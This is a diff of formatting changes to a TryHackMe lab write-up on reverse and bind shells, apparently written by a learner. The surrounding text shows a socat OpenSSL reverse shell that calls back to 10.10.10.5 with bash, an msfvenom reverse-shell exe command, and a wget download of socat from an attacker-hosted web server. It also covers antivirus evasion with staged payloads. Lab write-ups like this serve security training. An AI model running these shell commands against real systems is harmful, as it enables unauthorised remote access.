@@ -123,26 +123,23 @@ On the attacking machine:
 
 As you can see, this once again gives us code execution on the remote machine. Note that this is not specific to Windows.
 
-The important thing to understand here is that we are *listening* on the target, then connecting to it with our own machine.  
+The important thing to understand here is that we are *listening* on the target, then connecting to it with our own machine.
 
 ---
 
 The final concept which is relevant in this task is that of interactivity. Shells can be either *interactive* or *non-interactive*.
 
 * *Interactive:* If you've used Powershell, Bash, Zsh, sh, or any other standard CLI environment then you will be used to  
-    interactive shells. These allow you to interact with programs after executing them. For example, take the SSH login prompt:  
+    interactive shells. These allow you to interact with programs after executing them. For example, take the SSH login prompt:
     
     ![](https://i.imgur.com/0ayLj8L.png align="left")
     
-      
-    Here you can see that it's asking *interactively* that the user type either yes or no in order to continue the connection. This is an interactive program, which requires an interactive shell in order to run.  
-      
+    Here you can see that it's asking *interactively* that the user type either yes or no in order to continue the connection. This is an interactive program, which requires an interactive shell in order to run.
     
-* *Non-Interactive* shells don't give you that luxury. In a non-interactive shell you are limited to using programs which do not require user interaction in order to run properly. Unfortunately, the majority of simple reverse and bind shells are non-interactive, which can make further exploitation trickier. Let's see what happens when we try to run SSH in a non-interactive shell:  
+* *Non-Interactive* shells don't give you that luxury. In a non-interactive shell you are limited to using programs which do not require user interaction in order to run properly. Unfortunately, the majority of simple reverse and bind shells are non-interactive, which can make further exploitation trickier. Let's see what happens when we try to run SSH in a non-interactive shell:
     
     ![](https://i.imgur.com/rXyEDKU.png align="left")
     
-      
     Notice that the `whoami` command (which is non-interactive) executes perfectly, but the `ssh` command (which *is* interactive) gives us no output at all. As an interesting side note, the output of an interactive command *does* go somewhere, however, figuring out **where** is an exercise for you to attempt on your own. Suffice to say that interactive programs do not work in non-interactive shells.
     
 
@@ -213,8 +210,8 @@ These shells are very unstable by default. Pressing Ctrl + C kills the whole thi
 
 ---
 
-*Technique 1: Python  
-*
+\*Technique 1: Python  
+\*
 
 The first technique we'll be discussing is applicable only to Linux boxes, as they will nearly always have Python installed by default. This is a three stage process:
 
@@ -235,7 +232,7 @@ Note that if the shell dies, any input in your own terminal will not be visible 
 
 *Technique 2: rlwrap*
 
-rlwrap is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell*;* however, s*ome* manual stabilisation must still be utilised if you want to be able to use Ctrl + C inside the shell. rlwrap is not installed by default on Kali, so first install it with `sudo apt install rlwrap`.
+rlwrap is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell\*;\* however, s*ome* manual stabilisation must still be utilised if you want to be able to use Ctrl + C inside the shell. rlwrap is not installed by default on Kali, so first install it with `sudo apt install rlwrap`.
 
 To use rlwrap, we invoke a slightly different listener:
 
@@ -245,7 +242,7 @@ Prepending our netcat listener with "rlwrap" gives us a much more fully featured
 
 ---
 
- *Technique 3: Socat*
+*Technique 3: Socat*
 
 The third easy way to stabilise a shell is quite simply to use an initial netcat shell as a stepping stone into a more fully-featured socat shell. Bear in mind that this technique is limited to Linux targets, as a Socat shell on Windows will be no more stable than a netcat shell. To accomplish this method of stabilisation we would first transfer a [socat static compiled binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true) (a version of the program compiled to have no dependencies) up to the target machine. A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary (`sudo python3 -m http.server 80`), then, on the target machine, using the netcat shell to download the file. On Linux this would be accomplished with curl or wget (`wget <LOCAL-IP>/socat -O /tmp/socat`).
 
@@ -372,8 +369,8 @@ We covered how to create basic shells in the previous task, so that syntax will 
 
 We first need to generate a certificate in order to use encrypted shells. This is easiest to do on our attacking machine:
 
-`openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`  
-  
+`openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`
+
 This command creates a 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year. When you run this command it will ask you to fill in information about the certificate. This can be left blank, or filled randomly.
 
 We then need to merge the two created files into a single `.pem` file:
@@ -406,12 +403,11 @@ The following image shows an OPENSSL Reverse shell from a Linux target. As usual
 
 ![](https://i.imgur.com/UbOPN9q.png align="left")
 
-  
 This technique will also work with the special, Linux-only TTY shell covered in the previous task -- figuring out the syntax for this will be the challenge for this task. Feel free to use the Linux Practice box (deployable at the end of the room) to experiment if you're struggling to obtain the answer.
 
 ### Answer the questions below
 
-1. What is the syntax for setting up an OPENSSL-LISTENER using the tty technique from the previous task? Use port 53, and a PEM file called "encrypt.pem" `socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0` [`FILE:tty,raw,echo=0`](FILE:tty,raw,echo=0)
+1. What is the syntax for setting up an OPENSSL-LISTENER using the tty technique from the previous task? Use port 53, and a PEM file called "encrypt.pem" `socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0` \[`FILE:tty,raw,echo=0`\](FILE:tty,raw,echo=0)
     
 2. If your IP is 10.10.10.5, what syntax would you use to connect back to this listener? `socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane`
     
@@ -475,15 +471,15 @@ For other common reverse shell payloads, [PayloadsAllTheThings](https://github.c
 
 Msfvenom: the one-stop-shop for all things payload related.
 
-Part of the Metasploit framework, msfvenom is used to generate code for primarily reverse and bind shells. It is used extensively in lower-level exploit development to generate hexadecimal shellcode when developing something like a Buffer Overflow exploit; however, it can also be used to generate payloads in various formats (e.g. `.exe`, `.aspx`, `.war`, `.py`). It's this latter function that we will be making use of in this room. There is more to teach about msfvenom than could ever be fit into a single room, let alone a single task, so the following information will be a brief introduction to the concepts that will prove useful for this room.  
+Part of the Metasploit framework, msfvenom is used to generate code for primarily reverse and bind shells. It is used extensively in lower-level exploit development to generate hexadecimal shellcode when developing something like a Buffer Overflow exploit; however, it can also be used to generate payloads in various formats (e.g. `.exe`, `.aspx`, `.war`, `.py`). It's this latter function that we will be making use of in this room. There is more to teach about msfvenom than could ever be fit into a single room, let alone a single task, so the following information will be a brief introduction to the concepts that will prove useful for this room.
 
 The standard syntax for msfvenom is as follows:
 
-`msfvenom -p <PAYLOAD> <OPTIONS>`  
+`msfvenom -p <PAYLOAD> <OPTIONS>`
 
 For example, to generate a Windows x64 Reverse Shell in an exe format, we could use:
 
-`msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>`  
+`msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>`
 
 ![](https://i.imgur.com/JkWeFLq.png align="left")
 
@@ -508,22 +504,22 @@ Here we are using a payload and four options:
 
 ---
 
-*Staged vs Stageless*  
+*Staged vs Stageless*
 
 Before we go any further, there are another two concepts which must be introduced: ***staged*** reverse shell payloads and ***stageless*** reverse shell payloads.
 
-* ***Staged*** payloads are sent in two parts. The first part is called the *stager*. This is a piece of code which is executed directly on the server itself. It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself. Instead it connects to the listener and uses the connection to load the real payload, executing it directly and preventing it from touching the disk where it could be caught by traditional anti-virus solutions. Thus the payload is split into two parts -- a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated. Staged payloads require a special listener -- usually the Metasploit multi/handler, which will be covered in the next task.  
+* ***Staged*** payloads are sent in two parts. The first part is called the *stager*. This is a piece of code which is executed directly on the server itself. It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself. Instead it connects to the listener and uses the connection to load the real payload, executing it directly and preventing it from touching the disk where it could be caught by traditional anti-virus solutions. Thus the payload is split into two parts -- a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated. Staged payloads require a special listener -- usually the Metasploit multi/handler, which will be covered in the next task.
     
 * ***Stageless*** payloads are more common -- these are what we've been using up until now. They are entirely self-contained in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener.
     
 
-Stageless payloads tend to be easier to use and catch; however, they are also bulkier, and are easier for an antivirus or intrusion detection program to discover and remove. Staged payloads are harder to use, but the initial stager is a lot shorter, and is sometimes missed by less-effective antivirus software. Modern day antivirus solutions will also make use of the Anti-Malware Scan Interface (AMSI) to detect the payload as it is loaded into memory by the stager, making staged payloads less effective than they would once have been in this area.  
+Stageless payloads tend to be easier to use and catch; however, they are also bulkier, and are easier for an antivirus or intrusion detection program to discover and remove. Staged payloads are harder to use, but the initial stager is a lot shorter, and is sometimes missed by less-effective antivirus software. Modern day antivirus solutions will also make use of the Anti-Malware Scan Interface (AMSI) to detect the payload as it is loaded into memory by the stager, making staged payloads less effective than they would once have been in this area.
 
 ---
 
-*Meterpreter*  
+*Meterpreter*
 
-On the subject of Metasploit, another important thing to discuss is a *Meterpreter* shell. Meterpreter shells are Metasploit's own brand of fully-featured shell. They are completely stable, making them a very good thing when working with Windows targets. They also have a lot of inbuilt functionality of their own, such as file uploads and downloads. If we want to use any of Metasploit's post-exploitation tools then we need to use a meterpreter shell, however, that is a topic for another time. The downside to meterpreter shells is that they *must* be caught in Metasploit.  
+On the subject of Metasploit, another important thing to discuss is a *Meterpreter* shell. Meterpreter shells are Metasploit's own brand of fully-featured shell. They are completely stable, making them a very good thing when working with Windows targets. They also have a lot of inbuilt functionality of their own, such as file uploads and downloads. If we want to use any of Metasploit's post-exploitation tools then we need to use a meterpreter shell, however, that is a topic for another time. The downside to meterpreter shells is that they *must* be caught in Metasploit.
 
 ---
 
@@ -531,8 +527,8 @@ On the subject of Metasploit, another important thing to discuss is a *Meterpret
 
 When working with msfvenom, it's important to understand how the naming system works. The basic convention is as follows:
 
-`<OS>/<arch>/<payload>`  
-  
+`<OS>/<arch>/<payload>`
+
 For example:
 
 `linux/x86/shell_reverse_tcp`
@@ -541,7 +537,7 @@ This would generate a stageless reverse shell for an x86 Linux target.
 
 The exception to this convention is Windows 32bit targets. For these, the arch is not specified. e.g.:
 
-`windows/shell_reverse_tcp   `
+`windows/shell_reverse_tcp`
 
 For a 64bit Windows target, the arch would be specified as normal (x64).
 
@@ -663,10 +659,8 @@ Read the WebShells information.
 
 ## Next Steps
 
-Ok, we have a shell. Now what?  
-  
-  
-  
+Ok, we have a shell. Now what?
+
 We've covered lots of ways to generate, send and receive shells. The one thing that these all have in common is that they tend to be unstable and non-interactive. Even Unix style shells which are easier to stabilise are not ideal. So, what can we do about this?
 
 On Linux ideally we would be looking for opportunities to gain access to a user account. SSH keys stored at `/home/<user>/.ssh` are often an ideal way to do this. In CTFs it's also not infrequent to find credentials lying around somewhere on the box. Some exploits will also allow you to add your own account. In particular something like [Dirty C0w](https://dirtycow.ninja/) or a writeable /etc/shadow or /etc/passwd would quickly give you SSH access to the machine, assuming SSH is open.
@@ -754,4 +748,4 @@ To login using RDP:
 
 No answer required
 
-Thank you for reading my article. Please leave [any questions or commen](https://tryhackme.com/room/exploitingavulnerabilityv2)ts on improving my learning journey and the THM challenges.
+Thank you for reading my article. Please leave any questions or comments on improving my learning journey and the THM challenges.
